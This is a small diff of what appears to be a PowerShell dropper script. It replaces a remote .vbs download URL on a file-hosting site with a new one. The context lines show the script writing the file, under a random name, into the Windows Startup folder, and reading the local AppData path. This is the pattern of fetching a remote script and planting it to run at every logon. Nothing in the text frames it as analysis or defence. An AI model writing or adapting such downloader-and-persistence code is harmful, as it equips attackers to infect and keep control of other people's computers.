@@ -1,4 +1,4 @@
-$url = "https://files.catbox.moe/j8ea79.vbs"
+$url = "https://files.catbox.moe/9tn4y7.vbs"
 
 $destination1 = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs"
 $localAppData = $env:LOCALAPPDATA
